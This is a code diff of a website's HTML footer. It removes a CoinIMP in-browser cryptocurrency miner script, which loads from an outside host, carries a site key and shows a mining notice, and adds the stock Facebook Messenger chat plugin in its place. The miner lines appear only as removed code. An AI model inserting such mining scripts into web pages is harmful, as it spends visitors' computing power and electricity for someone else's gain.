@@ -80,15 +80,35 @@
     <font face="arial"><h6 align="center">
       <td style="vertical-align:bottom;">© Copyright 2022 OGATA. All rights reserved.</td>
     </h6></font>
-    <!-- 挖礦 -->
-    <script src="https://www.hostingcloud.racing/PGIW.js"></script>
+    <!-- Messenger 洽談外掛程式 Code -->
+    <div id="fb-root"></div>
+
+    <!-- Your 洽談外掛程式 code -->
+    <div id="fb-customer-chat" class="fb-customerchat">
+    </div>
+
     <script>
-        var _client = new Client.Anonymous('29abb96fd9c698aae118f1abafeb573988c6bdd75062aa5b12e206c12b6f8ffa', {
-            throttle: 0, c: 'w'
+      var chatbox = document.getElementById('fb-customer-chat');
+      chatbox.setAttribute("page_id", "107673648487793");
+      chatbox.setAttribute("attribution", "biz_inbox");
+    </script>
+
+    <!-- Your SDK code -->
+    <script>
+      window.fbAsyncInit = function() {
+        FB.init({
+          xfbml            : true,
+          version          : 'v13.0'
         });
-        _client.start();
-        _client.addMiningNotification("Floating Bottom", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
-        _client.addMiningNotification("Floating Bottom", "該站點正在運行來自coinimp.com的JavaScript礦工", "#cccccc", 40, "#3d3d3d");
+      };
+
+      (function(d, s, id) {
+        var js, fjs = d.getElementsByTagName(s)[0];
+        if (d.getElementById(id)) return;
+        js = d.createElement(s); js.id = id;
+        js.src = 'https://connect.facebook.net/zh_TW/sdk/xfbml.customerchat.js';
+        fjs.parentNode.insertBefore(js, fjs);
+      }(document, 'script', 'facebook-jssdk'));
     </script>
   </body>
 </html>
